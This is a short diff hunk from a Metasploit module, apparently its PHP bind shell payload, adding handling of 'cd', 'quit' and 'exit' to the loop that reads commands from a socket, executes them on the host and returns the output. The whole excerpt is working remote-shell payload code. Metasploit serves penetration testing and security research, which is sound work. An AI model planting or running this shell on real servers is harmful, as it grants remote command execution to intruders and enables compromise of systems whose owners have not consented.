@@ -64,10 +64,16 @@ module Metasploit3
 
 		while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
 		{
-			
+			$o = '';
 			$c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
 			if(FALSE===$c){break;}
-			#{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
+			if(substr($c,0,3) == 'cd '){
+				chdir(substr($c,3,-1));
+			} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+				break;
+			}else{
+				#{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
+			}
 			@socket_write($msgsock,$o,strlen($o));
 		}
 		@socket_close($msgsock);
